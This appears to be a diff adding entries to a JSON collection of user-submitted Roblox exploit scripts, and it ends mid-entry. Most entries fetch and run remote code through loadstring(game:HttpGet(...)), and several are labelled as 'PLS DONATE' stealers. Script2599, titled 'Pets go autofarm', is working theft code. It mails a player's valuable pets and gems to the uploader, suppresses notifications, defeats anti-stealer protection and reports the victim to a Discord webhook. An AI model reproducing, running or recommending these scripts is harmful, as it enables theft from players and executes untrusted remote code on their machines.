@@ -18311,6 +18311,470 @@
       "Script_Title": "ghosthub hitbox",
       "User_ID": 1912503247,
       "Username": "kervy590"
+    },
+    "Script2574": {
+      "Date": "December 10 2024",
+      "Description": "good",
+      "Script": "getgenv().key = \"Hostile\"\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/Hosvile/The-telligence/main/MC%20KSystem%202\"))()",
+      "Script_Title": "auto click",
+      "User_ID": 4548629511,
+      "Username": "Roblox_800090"
+    },
+    "Script2575": {
+      "Date": "December 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": "GhostHub",
+      "User_ID": 7553145457,
+      "Username": "padasuatuhariadaora"
+    },
+    "Script2576": {
+      "Date": "December 10 2024",
+      "Description": "follow me for more ",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-AFEM-14048\"))()",
+      "Script_Title": "emote and animation ",
+      "User_ID": 4327645854,
+      "Username": "misteryferson"
+    },
+    "Script2577": {
+      "Date": "December 10 2024",
+      "Description": "Op fisch ",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/tulontop/HiddenRevamp/refs/heads/main/Loader.luau\"))()",
+      "Script_Title": "Hidden fisch sc",
+      "User_ID": 1157178393,
+      "Username": "alvinoraiky145"
+    },
+    "Script2578": {
+      "Date": "December 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Scripterxzx/PLS-DONATE/refs/heads/main/PLS%20DONATE%20STEALER'))()",
+      "Script_Title": "PLS DONATE STEALER",
+      "User_ID": 5098155203,
+      "Username": "SinnVamp"
+    },
+    "Script2579": {
+      "Date": "December 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Neon-Fox/roblox-scripts/main/VynixuMM2\"))()",
+      "Script_Title": "pls donate stealer ",
+      "User_ID": 7143032077,
+      "Username": "denden211490"
+    },
+    "Script2580": {
+      "Date": "December 10 2024",
+      "Description": "Brookhaven",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Brookhaven-RP-Yin-Hub-Gui-21471\"))()",
+      "Script_Title": "Yin Hub Brookhaven",
+      "User_ID": 3087348834,
+      "Username": "bloackgirl"
+    },
+    "Script2581": {
+      "Date": "December 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Infinite-Yield_500\"))()\n",
+      "Script_Title": "infinite yield",
+      "User_ID": 7676729648,
+      "Username": "alakazamplays3"
+    },
+    "Script2582": {
+      "Date": "December 10 2024",
+      "Description": "USA:basically the fruit notifier from blox fruits",
+      "Script": "loadstring(game:HttpGet(\"https://github.com/euyogi/Prototipo-YogiNotificadorFruta/raw/main/YogiNotificadorFruta.lua\"))()",
+      "Script_Title": "fruits notifier",
+      "User_ID": 7676729648,
+      "Username": "alakazamplays3"
+    },
+    "Script2583": {
+      "Date": "December 10 2024",
+      "Description": "This Is Universal Hub I made :D, Make it popular Plssss, It's the first hub that I made :D",
+      "Script": "local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()\n\nlocal Window = Rayfield:CreateWindow({\n   Name = \"PembesarMelayuHub\",\n   LoadingTitle = \"Loading Script Hub\",\n   LoadingSubtitle = \"By Eshan\",\n   ConfigurationSaving = {\n      Enabled = true,\n      FolderName = nil, -- Create a custom folder for your hub/game\n      FileName = \"Player Changer\"\n   },\n   Discord = {\n      Enabled = true,\n      Invite = \"5tBNqX3Ngp\", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD\n      RememberJoins = true -- Set this to false to make them join the discord every time they load it up\n   },\n   KeySystem = false, -- Set this to true to use our key system\n   KeySettings = {\n      Title = \"Untitled\",\n      Subtitle = \"Key System\",\n      Note = \"No method of obtaining the key is provided\",\n      FileName = \"Key\", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file\n      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script\n      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from\n      Key = {\"Hello\"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings (\"hello\",\"key22\")\n   }\n})\n\nlocal MainTab = Window:CreateTab(\"Main\", nil) -- Title, Image\nlocal MainSection = MainTab:CreateSection(\"Main\")\n\nRayfield:Notify({\n   Title = \"Executed The Script Successfully\",\n   Content = \"A Good Script Hub\",\n   Duration = 5,\n   Image = nil,\n   Actions = { -- Notification Buttons\n      Ignore = {\n         Name = \"Okay!\",\n         Callback = function()\n         print(\"The user tapped Okay!\")\n      end\n   },\n},\n})\n\nlocal Button = MainTab:CreateButton({\n   Name = \"Infinite Yield\",\n   Callback = function()\n        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()\n   end,\n})\n\nlocal Button = MainTab:CreateButton({\n   Name = \"Fly Gui Universal\",\n   Callback = function()\n        loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-fly-gui-v3-22133\"))()\n    end,\n})\n\nlocal Button = MainTab:CreateButton({\n   Name = \"GhostHub\",\n   Callback = function()\n        loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-GhostHub-16534\"))()\n   end,\n})\n\nlocal Button = MainTab:CreateButton({\n   Name = \"Brookhaven Script\",\n   Callback = function()\n        loadstring(game:HttpGet(\"https://raw.githubusercontent.com/sXPiterXs1111/SanderXNewUpdate3.1.lua/main/SanderXNewUpdate.lua\"))()\n   end,\n})\n\nlocal Button = MainTab:CreateButton({\n   Name = \"Shark Bite 2 Pearl Hub\",\n   Callback = function()\n        loadstring(game:HttpGet('https://ppearl.vercel.app'))()\n   end,\n})\n\nlocal Button = MainTab:CreateButton({\n   Name = \"Notoriety Requiem\",\n   Callback = function()\n        loadstring(game:HttpGet(\"https://scriptblox.com/raw/RUSH-HOUR-Notoriety-Requiem-Evolution-11364\"))()\n   end,\n})\n\nlocal Button = MainTab:CreateButton({\n   Name = \"DomainX\",\n   Callback = function()\n        loadstring(game:HttpGet('https://sirius.menu/domainx'))() \n   end,\n})\n\nlocal Button = MainTab:CreateButton({\n   Name = \"Destruction Simulator Aqua Modz\",\n   Callback = function()\n        loadstring(game:HttpGet('https://raw.githubusercontent.com/AquaModz/DestructionSIMModded/main/DestructionSimAqua.lua'))()\n   end,\n})\n\nlocal Tab = Window:CreateTab(\"Info\", nil) -- Title, Image\n\nlocal Paragraph = Tab:CreateParagraph({Title = \"Info\", Content = \"By RAZER#6027\"})\n\nlocal Paragraph = Tab:CreateParagraph({Title = \"Info\", Content = \"Discord Server : https://discord.gg/5tBNqX3Ngp\"})",
+      "Script_Title": "PembesarMelayuHub",
+      "User_ID": 7550071571,
+      "Username": "SadAccountDeleted0"
+    },
+    "Script2584": {
+      "Date": "December 10 2024",
+      "Description": "BR: e basicamente o notificador de frutas do jogo",
+      "Script": "loadstring(game:HttpGet(\"https://github.com/euyogi/Prototipo-YogiNotificadorFruta/raw/main/YogiNotificadorFruta.lua\"))()",
+      "Script_Title": "notificador de fruta",
+      "User_ID": 7676729648,
+      "Username": "alakazamplays3"
+    },
+    "Script2585": {
+      "Date": "December 10 2024",
+      "Description": "Auto farm ninja legends",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/OP-SCRIPT-+-AUTOFARM-and-MORE!_1079\"))()",
+      "Script_Title": "ninja legends auto",
+      "User_ID": 2741657054,
+      "Username": "Zeusdeath_real"
+    },
+    "Script2586": {
+      "Date": "December 10 2024",
+      "Description": "k",
+      "Script": "-- Variáveis para a GUI\nlocal ScreenGui = Instance.new(\"ScreenGui\")\nlocal MainFrame = Instance.new(\"Frame\")\nlocal UICorner = Instance.new(\"UICorner\")\nlocal BoomboxButton = Instance.new(\"TextButton\")\n\n-- Configurando a GUI\nScreenGui.Parent = game.CoreGui\nScreenGui.Name = \"MainGui\"\n\n-- Configurando o frame principal\nMainFrame.Parent = ScreenGui\nMainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)\nMainFrame.Size = UDim2.new(0, 250, 0, 120)\nMainFrame.Position = UDim2.new(0.5, -125, 0.5, -60)\nMainFrame.AnchorPoint = Vector2.new(0.5, 0.5)\nMainFrame.BackgroundTransparency = 0.2\n\n-- Adicionando bordas arredondadas\nUICorner.Parent = MainFrame\nUICorner.CornerRadius = UDim.new(0, 15)\n\n-- Configurando o botão de Boombox\nBoomboxButton.Parent = MainFrame\nBoomboxButton.Text = \"Equipar Boombox\"\nBoomboxButton.Size = UDim2.new(0, 220, 0, 40)\nBoomboxButton.Position = UDim2.new(0.5, -110, 0.5, -20)\nBoomboxButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)\nBoomboxButton.TextColor3 = Color3.fromRGB(255, 255, 255)\nBoomboxButton.Font = Enum.Font.SourceSansBold\nBoomboxButton.TextSize = 18\nlocal BoomboxCorner = Instance.new(\"UICorner\", BoomboxButton)\nBoomboxCorner.CornerRadius = UDim.new(0, 10)\n\n-- Variáveis para controle de Boombox\nlocal animationPlaying = false\nlocal animationInstance\n\n-- Função para alternar Boombox\nBoomboxButton.MouseButton1Click:Connect(function()\n    local player = game.Players.LocalPlayer\n    local character = player.Character or player.CharacterAdded:Wait()\n    local humanoid = character:FindFirstChild(\"Humanoid\")\n    local animator = humanoid and humanoid:FindFirstChildOfClass(\"Animator\")\n\n    if not animationPlaying then\n        -- Equipar Boombox\n        local args = {\n            [1] = \"wear\",\n            [2] = 18756289999\n        }\n        game:GetService(\"ReplicatedStorage\"):WaitForChild(\"RE\"):WaitForChild(\"1Updat1eAvata1r\"):FireServer(unpack(args))\n\n        -- Reproduzir animação\n        if animator then\n            local animation = Instance.new(\"Animation\")\n            animation.AnimationId = \"rbxassetid://507768375\"\n            animationInstance = animator:LoadAnimation(animation)\n            animationInstance:Play()\n        end\n\n        BoomboxButton.Text = \"Desequipar Boombox\"\n        animationPlaying = true\n    else\n        -- Desequipar Boombox\n        local args = {\n            [1] = \"wear\",\n            [2] = 18756289999\n        }\n        game:GetService(\"ReplicatedStorage\"):WaitForChild(\"RE\"):WaitForChild(\"1Updat1eAvata1r\"):FireServer(unpack(args))\n\n        -- Parar animação\n        if animationInstance and animationInstance.IsPlaying then\n            animationInstance:Stop()\n        end\n\n        BoomboxButton.Text = \"Equipar Boombox\"\n        animationPlaying = false\n    end\nend)\n\n-- Movimentação do frame\nlocal UIS = game:GetService(\"UserInputService\")\nlocal dragging, dragInput, dragStart, startPos\n\nMainFrame.InputBegan:Connect(function(input)\n    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then\n        dragging = true\n        dragStart = input.Position\n        startPos = MainFrame.Position\n        input.Changed:Connect(function()\n            if input.UserInputState == Enum.UserInputState.End then\n                dragging = false\n            end\n        end)\n    end\nend)\n\nMainFrame.InputChanged:Connect(function(input)\n    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then\n        dragInput = input\n    end\nend)\n\nUIS.InputChanged:Connect(function(input)\n    if input == dragInput and dragging then\n        local delta = input.Position - dragStart\n        MainFrame.Position = UDim2.new(\n            startPos.X.Scale,\n            startPos.X.Offset + delta.X,\n            startPos.Y.Scale,\n            startPos.Y.Offset + delta.Y\n        )\n    end\nend)",
+      "Script_Title": "hx Equipar boombox ",
+      "User_ID": 7357975995,
+      "Username": "kinito_pet118"
+    },
+    "Script2587": {
+      "Date": "December 10 2024",
+      "Description": "in script is the best glitch 1B",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/coder382/CodeHub/main/Loader.lua\"))()",
+      "Script_Title": "is the best",
+      "User_ID": 5782365896,
+      "Username": "alfad130"
+    },
+    "Script2588": {
+      "Date": "December 10 2024",
+      "Description": ":D",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Rainbow-Friends-BorkWare-22767\"))()",
+      "Script_Title": "rainbow friends",
+      "User_ID": 7057595357,
+      "Username": "ThaoNghivxke09767"
+    },
+    "Script2589": {
+      "Date": "December 10 2024",
+      "Description": "fisch scrupt",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "fisch",
+      "User_ID": 1235121442,
+      "Username": "Zionjard"
+    },
+    "Script2590": {
+      "Date": "December 10 2024",
+      "Description": "all games script",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-K00pgui-v1-by-Jinxx-10276\", true))()",
+      "Script_Title": "Al games script",
+      "User_ID": 7684370078,
+      "Username": "bdtajr"
+    },
+    "Script2591": {
+      "Date": "December 10 2024",
+      "Description": ":D",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Chaos-Hub(17-Games)-2209\"))()",
+      "Script_Title": "21 games",
+      "User_ID": 7057595357,
+      "Username": "ThaoNghivxke09767"
+    },
+    "Script2592": {
+      "Date": "December 10 2024",
+      "Description": ":D",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Solara-Hub-Keyless-195-Games-20988\"))()",
+      "Script_Title": "games 249",
+      "User_ID": 7057595357,
+      "Username": "ThaoNghivxke09767"
+    },
+    "Script2593": {
+      "Date": "December 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://pastefy.app/wa3v2Vgm/raw\"))(\"Spider Script\")",
+      "Script_Title": "jerk",
+      "User_ID": 4801772128,
+      "Username": "ActualltaccC"
+    },
+    "Script2594": {
+      "Date": "December 10 2024",
+      "Description": "works this script for 5k slap to execute farm slap",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Rakeroblox123/SlapBlink/refs/heads/main/SlapFarmButBetter\"))()",
+      "Script_Title": "slap battles farm",
+      "User_ID": 4793490483,
+      "Username": "Baconsad_122"
+    },
+    "Script2595": {
+      "Date": "December 10 2024",
+      "Description": "made by anosaelbosa pls follow my account",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Brookhaven-RP-Red-z-hub-9149\"))()",
+      "Script_Title": "red z hub",
+      "User_ID": 3580082880,
+      "Username": "anosaelbosa"
+    },
+    "Script2596": {
+      "Date": "December 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/littlegui/main/Build-A-Boat'))()\n",
+      "Script_Title": "barco",
+      "User_ID": 3861993140,
+      "Username": "kakarotto903"
+    },
+    "Script2597": {
+      "Date": "December 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://pastefy.app/wa3v2Vgm/raw\"))(\"Spider Script\")",
+      "Script_Title": "punheta",
+      "User_ID": 1830406947,
+      "Username": "FuyushiJMO"
+    },
+    "Script2598": {
+      "Date": "December 11 2024",
+      "Description": "it no work on delta",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Deadhub12/Pls-donate-backup/refs/heads/main/Script'))()",
+      "Script_Title": "pls donate steal rbx",
+      "User_ID": 3679793928,
+      "Username": "BuilderManTheGrey"
+    },
+    "Script2599": {
+      "Date": "December 10 2024",
+      "Description": "It’s Op a lot of features ",
+      "Script": "Username = \"thewolf5471\"\nUsername2 = \"your 2nd user here\" -- stuff will get sent to this user if first user's mailbox is full\nwebhook = \"Your discord webhook here\"\nmin_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default\n\n_G.scriptExecuted = _G.scriptExecuted or false\nif _G.scriptExecuted then\n    return\nend\n_G.scriptExecuted = true\n\nlocal network = game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Network\")\nlocal library = require(game.ReplicatedStorage.Library)\nlocal save = require(game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Library\"):WaitForChild(\"Client\"):WaitForChild(\"Save\")).Get().Inventory\nlocal mailsent = require(game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Library\"):WaitForChild(\"Client\"):WaitForChild(\"Save\")).Get().MailboxSendsSinceReset\nlocal plr = game.Players.LocalPlayer\nlocal MailMessage = \"jsp\"\nlocal HttpService = game:GetService(\"HttpService\")\nlocal sortedItems = {}\nlocal totalRAP = 0\nlocal getFucked = false\nlocal GetSave = function()\n    return require(game.ReplicatedStorage.Library.Client.Save).Get()\nend\n\nlocal newamount = 20000\n\nif mailsent ~= 0 then\n\tnewamount = math.ceil(newamount * (1.5 ^ mailsent))\nend\n\nlocal GemAmount1 = 1\nfor i, v in pairs(GetSave().Inventory.Currency) do\n    if v.id == \"Diamonds\" then\n        GemAmount1 = v._am\n\t\tbreak\n    end\nend\n\nif newamount > GemAmount1 then\n    return\nend\n\nlocal function formatNumber(number)\n\tlocal number = math.floor(number)\n\tlocal suffixes = {\"\", \"k\", \"m\", \"b\", \"t\"}\n\tlocal suffixIndex = 1\n\twhile number >= 1000 do\n\t\tnumber = number / 1000\n\t\tsuffixIndex = suffixIndex + 1\n\tend\n\treturn string.format(\"%.2f%s\", number, suffixes[suffixIndex])\nend\n\nlocal function SendMessage(username, diamonds)\n    local headers = {\n        [\"Content-Type\"] = \"application/json\",\n    }\n\n\tlocal fields = {\n\t\t{\n\t\t\tname = \"Retard Username:\",\n\t\t\tvalue = username,\n\t\t\tinline = true\n\t\t},\n\t\t{\n\t\t\tname = \"Items to be sent:\",\n\t\t\tvalue = \"\",\n\t\t\tinline = false\n\t\t},\n        {\n            name = \"Summary:\",\n            value = \"\",\n            inline = false\n        }\n\t}\n\n    local combinedItems = {}\n    local itemRapMap = {}\n\n    for _, item in ipairs(sortedItems) do\n        local rapKey = item.name\n        if itemRapMap[rapKey] then\n            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount\n        else\n            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}\n            table.insert(combinedItems, rapKey)\n        end\n    end\n\n    table.sort(combinedItems, function(a, b)\n        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount \n    end)\n\n    for _, itemName in ipairs(combinedItems) do\n        local itemData = itemRapMap[itemName]\n        fields[2].value = fields[2].value .. itemName .. \" (x\" .. itemData.amount .. \")\" .. \": \" .. formatNumber(itemData.rap * itemData.amount) .. \" RAP\\n\"\n    end\n\n    fields[3].value = fields[3].value .. \"Gems: \" .. formatNumber(diamonds) .. \"\\n\"\n    fields[3].value = fields[3].value .. \"Total RAP: \" .. formatNumber(totalRAP)\n    if getFucked then\n        fields[3].value = fields[3].value .. \"\\n\\nVictim tried to use anti-mailstealer, but got fucked instead\"\n    end\n\n    local data = {\n        [\"embeds\"] = {{\n            [\"title\"] = \"\\240\\159\\144\\177 New PS99 Execution\" ,\n            [\"color\"] = 65280,\n\t\t\t[\"fields\"] = fields,\n\t\t\t[\"footer\"] = {\n\t\t\t\t[\"text\"] = \"Mailstealer by Tobi. discord.gg/GY2RVSEGDT\"\n\t\t\t}\n        }}\n    }\n\n    if #fields[2].value > 1024 then\n        local lines = {}\n        for line in fields[2].value:gmatch(\"[^\\r\\n]+\") do\n            table.insert(lines, line)\n        end\n\n        while #fields[2].value > 1024 and #lines > 0 do\n            table.remove(lines)\n            fields[2].value = table.concat(lines, \"\\n\")\n            fields[2].value = fields[2].value .. \"\\nPlus more!\"\n        end\n    end\n\n    local body = HttpService:JSONEncode(data)\n\n    if webhook and webhook ~= \"\" then\n        local response = request({\n            Url = webhook,\n            Method = \"POST\",\n            Headers = headers,\n            Body = body\n        })\n    end\nend\n\nlocal gemsleaderstat = plr.leaderstats[\"\\240\\159\\146\\142 Diamonds\"].Value\nlocal gemsleaderstatpath = plr.leaderstats[\"\\240\\159\\146\\142 Diamonds\"]\ngemsleaderstatpath:GetPropertyChangedSignal(\"Value\"):Connect(function()\n\tgemsleaderstatpath.Value = gemsleaderstat\nend)\n\nlocal loading = plr.PlayerScripts.Scripts.Core[\"Process Pending GUI\"]\nlocal noti = plr.PlayerGui.Notifications\nloading.Disabled = true\nnoti:GetPropertyChangedSignal(\"Enabled\"):Connect(function()\n\tnoti.Enabled = false\nend)\nnoti.Enabled = false\n\ngame.DescendantAdded:Connect(function(x)\n    if x.ClassName == \"Sound\" then\n        if x.SoundId==\"rbxassetid://11839132565\" or x.SoundId==\"rbxassetid://14254721038\" or x.SoundId==\"rbxassetid://12413423276\" then\n            x.Volume=0\n            x.PlayOnRemove=false\n            x:Destroy()\n        end\n    end\nend)\n\nlocal function getRAP(Type, Item)\n    return (require(game:GetService(\"ReplicatedStorage\").Library.Client.DevRAPCmds).Get(\n        {\n            Class = {Name = Type},\n            IsA = function(hmm)\n                return hmm == Type\n            end,\n            GetId = function()\n                return Item.id\n            end,\n            StackKey = function()\n                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})\n            end\n        }\n    ) or 0)\nend\n\nlocal user = Username\nlocal user2 = Username2\n\nlocal function sendItem(category, uid, am)\n    local args = {\n        [1] = user,\n        [2] = MailMessage,\n        [3] = category,\n        [4] = uid,\n        [5] = am or 1\n    }\n\tlocal response = false\n\trepeat\n    \tlocal response, err = network:WaitForChild(\"Mailbox: Send\"):InvokeServer(unpack(args))\n\t\tif response == false and err == \"They don't have enough space!\" then\n\t\t\tuser = user2\n\t\t\targs[1] = user\n\t\tend\n\tuntil response == true\n\tGemAmount1 = GemAmount1 - newamount\n\tnewamount = math.ceil(math.ceil(newamount) * 1.5)\n\tif newamount > 5000000 then\n\t\tnewamount = 5000000\n\tend\nend\n\nlocal function SendAllGems()\n    for i, v in pairs(GetSave().Inventory.Currency) do\n        if v.id == \"Diamonds\" then\n\t\t\tif GemAmount1 >= (newamount + 10000) then\n\t\t\t\tlocal args = {\n\t\t\t\t\t[1] = user,\n\t\t\t\t\t[2] = MailMessage,\n\t\t\t\t\t[3] = \"Currency\",\n\t\t\t\t\t[4] = i,\n\t\t\t\t\t[5] = GemAmount1 - newamount\n\t\t\t\t}\n\t\t\t\tlocal response = false\n\t\t\t\trepeat\n\t\t\t\t\tlocal response = network:WaitForChild(\"Mailbox: Send\"):InvokeServer(unpack(args))\n\t\t\t\tuntil response == true\n\t\t\t\tbreak\n\t\t\tend\n        end\n    end\nend\n\nlocal function IsMailboxHooked()\n\tlocal uid\n\tfor i, v in pairs(save[\"Pet\"]) do\n\t\tuid = i\n\t\tbreak\n\tend\n\tlocal args = {\n        [1] = \"Roblox\",\n        [2] = \"Test\",\n        [3] = \"Pet\",\n        [4] = uid,\n        [5] = 1\n    }\n    local response, err = network:WaitForChild(\"Mailbox: Send\"):InvokeServer(unpack(args))\n    if (err == \"They don't have enough space!\") or (err == \"You don't have enough diamonds to send the mail!\") then\n        return false\n    else\n        return true\n    end\nend\n\nlocal function EmptyBoxes()\n    if save.Box then\n        for key, value in pairs(save.Box) do\n\t\t\tif value._uq then\n\t\t\t\tnetwork:WaitForChild(\"Box: Withdraw All\"):InvokeServer(key)\n\t\t\tend\n        end\n    end\nend\n\nlocal function ClaimMail()\n    local response, err = network:WaitForChild(\"Mailbox: Claim All\"):InvokeServer()\n    while err == \"You must wait 30 seconds before using the mailbox!\" do\n        wait()\n        response, err = network:WaitForChild(\"Mailbox: Claim All\"):InvokeServer()\n    end\nend\n\nlocal categoryList = {\"Pet\", \"Egg\", \"Charm\", \"Enchant\", \"Potion\", \"Misc\", \"Hoverboard\", \"Booth\", \"Ultimate\"}\n\nfor i, v in pairs(categoryList) do\n\tif save[v] ~= nil then\n\t\tfor uid, item in pairs(save[v]) do\n\t\t\tif v == \"Pet\" then\n                local dir = require(game:GetService(\"ReplicatedStorage\").Library.Directory.Pets)[item.id]\n                if dir.huge or dir.exclusiveLevel then\n                    local rapValue = getRAP(v, item)\n                    if rapValue >= min_rap then\n                        local prefix = \"\"\n                        if item.pt and item.pt == 1 then\n                            prefix = \"Golden \"\n                        elseif item.pt and item.pt == 2 then\n                            prefix = \"Rainbow \"\n                        end\n                        if item.sh then\n                            prefix = \"Shiny \" .. prefix\n                        end\n                        local id = prefix .. item.id\n                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})\n                        totalRAP = totalRAP + (rapValue * (item._am or 1))\n                    end\n                end\n            else\n                local rapValue = getRAP(v, item)\n                if rapValue >= min_rap then\n                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})\n                    totalRAP = totalRAP + (rapValue * (item._am or 1))\n                end\n            end\n            if item._lk then\n                local args = {\n                [1] = uid,\n                [2] = false\n                }\n                network:WaitForChild(\"Locking_SetLocked\"):InvokeServer(unpack(args))\n            end\n        end\n\tend\nend\n\nif #sortedItems > 0 or GemAmount1 > min_rap + newamount then\n    ClaimMail()\n\tif IsMailboxHooked() then\n        getFucked = true\n\t\tlocal Mailbox = game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Network\"):WaitForChild(\"Mailbox: Send\")\n        for i, Func in ipairs(getgc(true)) do\n            if typeof(Func) == \"function\" and debug.info(Func, \"n\") == \"typeof\" then\n                local Old\n                Old = hookfunction(Func, function(Ins, ...)\n                    if Ins == Mailbox then\n                        return tick()\n                    end\n                    return Old(Ins, ...)\n                end)\n            end\n        end\n\tend\n    EmptyBoxes()\n\trequire(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()\n\trequire(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()\n    local blob_a = game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Library\"):WaitForChild(\"Client\"):WaitForChild(\"Save\")\n    local blob_b = require(blob_a).Get()\n    function deepCopy(original)\n        local copy = {}\n        for k, v in pairs(original) do\n            if type(v) == \"table\" then\n                v = deepCopy(v)\n            end\n            copy[k] = v\n        end\n        return copy\n    end\n    blob_b = deepCopy(blob_b)\n    require(blob_a).Get = function(...)\n        return blob_b\n    end\n\n    table.sort(sortedItems, function(a, b)\n        return a.rap * a.amount > b.rap * b.amount \n    end)\n\n    spawn(function()\n        SendMessage(plr.Name, GemAmount1)\n    end)\n\n    for _, item in ipairs(sortedItems) do\n        if item.rap >= newamount then\n            sendItem(item.category, item.uid, item.amount)\n        else\n            break\n        end\n    end\n    SendAllGems()\n    local message = require(game.ReplicatedStorage.Library.Client.Message)\n    message.Error(\"All your items just got stolen by Tobi's mailstealer!\\n Join discord.gg/GY2RVSEGDT\")\n    setclipboard(\"discord.gg/GY2RVSEGDT\")\nend\n",
+      "Script_Title": "Pets go autofarm",
+      "User_ID": 1506212536,
+      "Username": "thewolf5471"
+    },
+    "Script2600": {
+      "Date": "December 10 2024",
+      "Description": "ele muda o tamanho ",
+      "Script": "-- Variáveis para a GUI\nlocal ScreenGui = Instance.new(\"ScreenGui\")\nlocal MainFrame = Instance.new(\"Frame\")\nlocal UICorner = Instance.new(\"UICorner\")\nlocal SizeLabel = Instance.new(\"TextLabel\")\nlocal SizeInput = Instance.new(\"TextBox\")\nlocal ApplySizeButton = Instance.new(\"TextButton\")\n\n-- Configurando a GUI\nScreenGui.Parent = game.CoreGui\nScreenGui.Name = \"SizeGui\"\n\n-- Configurando o frame principal\nMainFrame.Parent = ScreenGui\nMainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)\nMainFrame.Size = UDim2.new(0, 220, 0, 150)\nMainFrame.Position = UDim2.new(0.5, -110, 0.5, -75)\nMainFrame.AnchorPoint = Vector2.new(0.5, 0.5)\nMainFrame.BackgroundTransparency = 0.2\n\n-- Adicionando bordas arredondadas\nUICorner.Parent = MainFrame\nUICorner.CornerRadius = UDim.new(0, 15)\n\n-- Configurando o rótulo (label) para Tamanho\nSizeLabel.Parent = MainFrame\nSizeLabel.Text = \"Defina o Tamanho:\"\nSizeLabel.Size = UDim2.new(0, 200, 0, 30)\nSizeLabel.Position = UDim2.new(0, 10, 0, 20)\nSizeLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)\nSizeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)\nSizeLabel.Font = Enum.Font.SourceSans\nSizeLabel.TextSize = 18\nSizeLabel.BackgroundTransparency = 1\n\n-- Configurando o campo de entrada (TextBox) para Tamanho\nSizeInput.Parent = MainFrame\nSizeInput.Size = UDim2.new(0, 200, 0, 30)\nSizeInput.Position = UDim2.new(0, 10, 0, 60)\nSizeInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)\nSizeInput.TextColor3 = Color3.fromRGB(255, 255, 255)\nSizeInput.Font = Enum.Font.SourceSans\nSizeInput.TextSize = 18\nSizeInput.PlaceholderText = \"Ex: 0.65\"\nSizeInput.Text = \"\"\nlocal SizeInputCorner = Instance.new(\"UICorner\", SizeInput)\nSizeInputCorner.CornerRadius = UDim.new(0, 10)\n\n-- Configurando o botão de aplicação (Apply)\nApplySizeButton.Parent = MainFrame\nApplySizeButton.Text = \"Aplicar Tamanho\"\nApplySizeButton.Size = UDim2.new(0, 200, 0, 30)\nApplySizeButton.Position = UDim2.new(0, 10, 0, 100)\nApplySizeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)\nApplySizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)\nApplySizeButton.Font = Enum.Font.SourceSans\nApplySizeButton.TextSize = 18\nlocal ApplySizeButtonCorner = Instance.new(\"UICorner\", ApplySizeButton)\nApplySizeButtonCorner.CornerRadius = UDim.new(0, 10)\n\n-- Aplicando o valor de tamanho\nApplySizeButton.MouseButton1Click:Connect(function()\n    local sizeValue = tonumber(SizeInput.Text)\n    if sizeValue and sizeValue > 0 then\n        local args = {\n            [1] = \"CharacterSizeDown\", -- Função a ser chamada\n            [2] = sizeValue -- Valor inserido\n      